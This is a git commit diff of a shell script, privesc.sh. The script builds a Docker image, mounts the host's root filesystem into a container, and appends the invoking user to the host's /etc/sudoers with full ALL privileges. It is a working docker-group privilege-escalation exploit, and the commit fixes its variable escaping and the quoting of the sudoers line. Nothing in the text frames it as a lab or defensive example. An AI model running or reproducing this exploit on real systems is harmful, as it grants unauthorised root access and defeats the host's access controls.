fd8d672be11629e420a971ec618eb5d80e4de384
juanBailon <juanojo2001.5@gmail.com>
2023-11-23 00:36:31 -0500

    commit 2

--- privesc.sh
+++ privesc.sh
@@ -9,15 +9,15 @@ FROM debian:wheezy
 
 ENV WORKDIR /privesc
 
-RUN mkdir -p $WORKDIR
+RUN mkdir -p \$WORKDIR
 
-VOLUME [ $WORKDIR ]
+VOLUME [ \$WORKDIR ]
 
-WORKDIR $WORKDIR
+WORKDIR \$WORKDIR
 "
 
 echo -e "$docker_content" > Dockerfile
 
 docker build -t privesc .
 
-docker run -v /:/privesc -it privesc /bin/bash -c "echo \"$my_user\" ALL=(ALL:ALL) ALL >> /privesc/etc/sudoers"
+docker run -v /:/privesc -it privesc /bin/bash -c "echo \"$my_user ALL=(ALL:ALL) ALL\" >> /privesc/etc/sudoers"
